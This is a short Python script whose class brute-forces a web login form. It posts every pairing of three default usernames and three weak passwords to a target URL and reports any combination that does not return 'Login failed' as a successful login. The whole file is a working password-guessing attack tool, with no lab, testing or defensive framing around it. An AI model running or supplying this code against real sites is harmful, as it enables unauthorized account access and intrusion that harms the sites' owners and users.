import requests

class BruteForce:
    def __init__(self):
        pass

    def brute_force_login(self, url, username_field="username", password_field="password"):
        usernames = ["admin", "user", "test"]
        passwords = ["password", "123456", "admin123"]
        
        print(f"[+] Starting brute force attack on {url}")
        
        for username in usernames:
            for password in passwords:
                data = {
                    username_field: username,
                    password_field: password,
                }
                response = requests.post(url, data=data)
                
                if "Login failed" not in response.text:
                    print(f"[+] Successful login: {username}:{password}")
                    return username, password
                
                print(f"[-] Failed login attempt: {username}:{password}")
        
        print("[-] No valid credentials found.")

